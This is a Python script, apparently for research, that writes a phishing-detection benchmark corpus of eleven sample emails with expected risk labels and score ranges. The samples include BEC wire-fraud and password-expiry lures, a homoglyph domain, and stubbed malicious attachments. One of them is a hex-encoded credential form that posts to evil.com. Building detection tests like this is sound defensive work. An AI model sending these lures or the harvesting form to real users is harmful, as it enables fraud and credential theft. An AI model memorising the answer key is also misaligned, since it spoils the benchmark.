import json
import os
import sys

if hasattr(sys.stdout, 'reconfigure'):
    sys.stdout.reconfigure(encoding='utf-8')

BENCHMARK_CASES = [
    {
        "id": "CASE-01-BEC-CEO-FRAUD",
        "name": "CEO Fraud / Business Email Compromise (BEC)",
        "category": "BEC_SPOOFING",
        "expected_risk": "HIGH",
        "expected_score_range": [75, 95],
        "description": "Executive display name spoofing with free-mail Reply-To diversion and high financial urgency.",
        "raw_headers": """From: "Satya Nadella <satya.nadella@microsoft.com>" <exec-alert-team@gmail.com>
Reply-To: wire-desk-urgent@freemail-secure.com
Return-Path: <bounces@mass-marketing-server.net>
Authentication-Results: mx.microsoft.com; spf=fail (domain does not designate IP); dkim=none; dmarc=fail
Subject: STRICTLY CONFIDENTIAL: Immediate Acquisition Wire Transfer Needed
Date: Fri, 16 Oct 2026 09:30:00 +0000""",
        "body_text": "I am in an urgent confidential meeting. Please initiate an immediate wire transfer of $45,000 to the attached vendor account without delay. Do not call my office line.",
        "attachments": []
    },
    {
        "id": "CASE-02-LINK-MISMATCH-HARVEST",
        "name": "M365 Credential Harvester with Link Text Mismatch",
        "category": "CREDENTIAL_HARVESTING",
        "expected_risk": "HIGH",
        "expected_score_range": [80, 100],
        "description": "Deceptive HTML anchor text displaying a legitimate Microsoft URL while href routes to an IP literal.",
        "raw_headers": """From: "Microsoft 365 Security" <no-reply@security-msft-support.org>
Reply-To: no-reply@security-msft-support.org
Return-Path: <bounce@security-msft-support.org>
Authentication-Results: mx.company.com; spf=softfail; dkim=none; dmarc=none
Subject: URGENT: Your Microsoft 365 Password Expires Today
Date: Fri, 16 Oct 2026 10:00:00 +0000""",
        "body_text": """<html><body>
<p>Your password will be deactivated within 24 hours. Please keep your current password by verifying below:</p>
<p><a href="http://192.168.1.105/auth/login">https://login.microsoftonline.com/common/oauth2</a></p>
</body></html>""",
        "attachments": []
    },
    {
        "id": "CASE-03-HOMOGLYPH-TYPOSQUAT",
        "name": "PayPal Lookalike Domain (Homoglyph & Combosquatting)",
        "category": "TYPOSQUATTING",
        "expected_risk": "HIGH",
        "expected_score_range": [70, 90],
        "description": "Attacker registers 'paypa1-security-verification.com' with character substitution '1' for 'l'.",
        "raw_headers": """From: "PayPal Account Security" <service@paypa1-security-verification.com>
Reply-To: service@paypa1-security-verification.com
Return-Path: <bounces@paypa1-security-verification.com>
Authentication-Results: mx.company.com; spf=none; dkim=none; dmarc=none
Subject: Your PayPal account has been limited
Date: Fri, 16 Oct 2026 11:15:00 +0000""",
        "body_text": """<html><body>
<p>Unauthorized login detected from IP 45.33.12.98. Log in to restore your account:</p>
<p><a href="https://paypa1-security-verification.com/restore">https://paypa1-security-verification.com/restore</a></p>
</body></html>""",
        "attachments": []
    },
    {
        "id": "CASE-04-ATTACHMENT-DOUBLE-EXT",
        "name": "Double Extension Malware Dropper",
        "category": "MALICIOUS_ATTACHMENT",
        "expected_risk": "HIGH",
        "expected_score_range": [85, 100],
        "description": "Attachment named 'Q3_Payroll_Adjustment.pdf.exe' with Windows PE 'MZ' magic bytes.",
        "raw_headers": """From: "HR Benefits Portal" <benefits@hr-cloud-portal.com>
Subject: Q3 Payroll and Bonus Adjustment Schedule
Authentication-Results: mx.company.com; spf=none; dkim=none; dmarc=none""",
        "body_text": "Please find attached your Q3 salary adjustment calculation. Review before end of day.",
        "attachments": [
            {
                "filename": "Q3_Payroll_Adjustment.pdf.exe",
                "declared_type": "application/pdf",
                "content_hex": "4d5a90000300000004000000ffff0000" # MZ magic header
            }
        ]
    },
    {
        "id": "CASE-05-ATTACHMENT-RTLO-TRICK",
        "name": "Unicode RTLO Deceptive Filename",
        "category": "MALICIOUS_ATTACHMENT",
        "expected_risk": "HIGH",
        "expected_score_range": [85, 100],
        "description": "Filename uses character U+202E to reverse file extension visually.",
        "raw_headers": """From: "Legal Contracts" <legal@contracts-advisory.com>
Subject: Final Agreement for Review
Authentication-Results: mx.company.com; spf=pass; dkim=none; dmarc=none""",
        "body_text": "Please sign the attached NDA document.",
        "attachments": [
            {
                "filename": "Contract_Agreement_\u202efdp.exe",
                "declared_type": "application/pdf",
                "content_hex": "4d5a9000" # MZ magic bytes
            }
        ]
    },
    {
        "id": "CASE-06-ATTACHMENT-OFFICE-MACRO",
        "name": "Macro-Enabled Document with Execution Strings",
        "category": "MALICIOUS_ATTACHMENT",
        "expected_risk": "HIGH",
        "expected_score_range": [80, 100],
        "description": "OOXML .docm file containing hidden VBA code with AutoOpen and PowerShell dropper.",
        "raw_headers": """From: "Supplier Billing" <billing@logistics-fastpay.net>
Subject: Overdue Invoice #88492
Authentication-Results: mx.company.com; spf=pass; dkim=none; dmarc=none""",
        "body_text": "Please enable editing and macros to view your itemized billing statement.",
        "attachments": [
            {
                "filename": "Invoice_88492.docm",
                "declared_type": "application/vnd.ms-word.document.macroEnabled.12",
                "content_hex": "504b0304" + "76626150726f6a6563742e62696e" + "4175746f4f70656e" + "5368656c6c" # ZIP + vbaProject.bin + AutoOpen + Shell
            }
        ]
    },
    {
        "id": "CASE-07-ATTACHMENT-PDF-EXPLOIT",
        "name": "PDF Document with Active /JavaScript and /OpenAction",
        "category": "MALICIOUS_ATTACHMENT",
        "expected_risk": "HIGH",
        "expected_score_range": [75, 95],
        "description": "PDF containing automatic script execution triggers without user interaction.",
        "raw_headers": """From: "Customer Support" <support@scanned-documents-cloud.com>
Subject: Scanned Doc from Xerox WorkCentre
Authentication-Results: mx.company.com; spf=neutral; dkim=none; dmarc=none""",
        "body_text": "Attached is your scanned document.",
        "attachments": [
            {
                "filename": "Scanned_Document.pdf",
                "declared_type": "application/pdf",
                "content_hex": "255044462d312e370a2f4f70656e416374696f6e202f4a617661536372697074" # %PDF-1.7\n/OpenAction /JavaScript
            }
        ]
    },
    {
        "id": "CASE-08-ATTACHMENT-HTML-SMUGGLING",
        "name": "HTML Smuggling & Credential Harvester",
        "category": "MALICIOUS_ATTACHMENT",
        "expected_risk": "HIGH",
        "expected_score_range": [80, 100],
        "description": "HTML attachment containing embedded login form and JavaScript Blob download smuggler.",
        "raw_headers": """From: "Voicemail Notification" <voicemail@office-telecom-system.com>
Subject: You have a new audio voicemail (0:48)
Authentication-Results: mx.company.com; spf=none; dkim=none; dmarc=none""",
        "body_text": "Please open the attached HTML file in your browser to listen to your secure voicemail.",
        "attachments": [
            {
                "filename": "Audio_Voicemail.html",
                "declared_type": "text/html",
                "content_hex": "3c666f726d20616374696f6e3d22687474703a2f2f6576696c2e636f6d223e3c696e70757420747970653d2270617373776f7264223e" # <form action="http://evil.com"><input type="password">
            }
        ]
    },
    {
        "id": "CASE-09-PASSWORD-PROTECTED-ARCHIVE",
        "name": "Password-Protected ZIP with Password Disclosed in Body",
        "category": "ARCHIVE_EVASION",
        "expected_risk": "HIGH",
        "expected_score_range": [75, 95],
        "description": "Encrypted archive paired with email body text revealing password to bypass perimeter SEGs.",
        "raw_headers": """From: "Legal Audit" <compliance@audit-regulatory-portal.org>
Subject: CONFIDENTIAL: Regulatory Compliance Review
Authentication-Results: mx.company.com; spf=none; dkim=none; dmarc=none""",
        "body_text": "To protect confidentiality, the attached audit report is encrypted. The password is: SecurePass2026! to extract it.",
        "attachments": [
            {
                "filename": "Audit_Report.zip",
                "declared_type": "application/zip",
                "is_encrypted": True,
                "content_hex": "504b030414000100" # ZIP header with general purpose bit 0 set (encrypted)
            }
        ]
    },
    {
        "id": "CASE-10-BENIGN-SECURITY-ALERT",
        "name": "Benign Lookalike: Legitimate GitHub Security Notice",
        "category": "BENIGN_LOOKALIKE",
        "expected_risk": "LOW",
        "expected_score_range": [0, 20],
        "description": "Legitimate security alert with valid cryptographic SPF/DKIM/DMARC pass and verified official URLs.",
        "raw_headers": """From: "GitHub" <noreply@github.com>
Reply-To: support@github.com
Return-Path: <noreply@github.com>
Authentication-Results: mx.company.com; spf=pass (github.com: domain designates IP); dkim=pass header.i=@github.com; dmarc=pass
Subject: [GitHub] A new personal access token was generated
Date: Fri, 16 Oct 2026 12:00:00 +0000""",
        "body_text": """<html><body>
<p>Hi user,</p>
<p>A new personal access token (classic) was recently generated on your account.</p>
<p>If you did not generate this token, please visit your settings:
   <a href="https://github.com/settings/tokens">https://github.com/settings/tokens</a>
</p>
<p>GitHub Support Team</p>
</body></html>""",
        "attachments": []
    },
    {
        "id": "CASE-11-BENIGN-MARKETING-NEWSLETTER",
        "name": "Benign Lookalike: Corporate Marketing Newsletter",
        "category": "BENIGN_LOOKALIKE",
        "expected_risk": "LOW",
        "expected_score_range": [0, 25],
        "description": "Marketing digest containing promotional urgency ('Sale ends tonight') with fully aligned authentication and legitimate unsubscribe mechanisms.",
        "raw_headers": """From: "TechGear Weekly" <news@techgear-retail.com>
Reply-To: support@techgear-retail.com
Return-Path: <bounces@techgear-retail.com>
Authentication-Results: mx.company.com; spf=pass; dkim=pass; dmarc=pass
Subject: Final Call: 40% Off Developer Hardware Ends Tonight!
Date: Fri, 16 Oct 2026 13:00:00 +0000""",
        "body_text": """<html><body>
<p>Don't miss out! Our annual flash sale ends tonight at midnight.</p>
<p><a href="https://techgear-retail.com/deals">https://techgear-retail.com/deals</a></p>
<p>To unsubscribe from these promotional emails, click <a href="https://techgear-retail.com/unsubscribe">here</a>.</p>
</body></html>""",
        "attachments": []
    }
]

def save_benchmark_corpus():
    os.makedirs("research/benchmarks/corpus", exist_ok=True)
    filepath = "research/benchmarks/corpus/benchmark_corpus.json"
    with open(filepath, "w", encoding="utf-8") as f:
        json.dump(BENCHMARK_CASES, f, indent=2)
    print(f"[+] Successfully saved {len(BENCHMARK_CASES)} benchmark cases to {filepath}")

if __name__ == '__main__':
    save_benchmark_corpus()
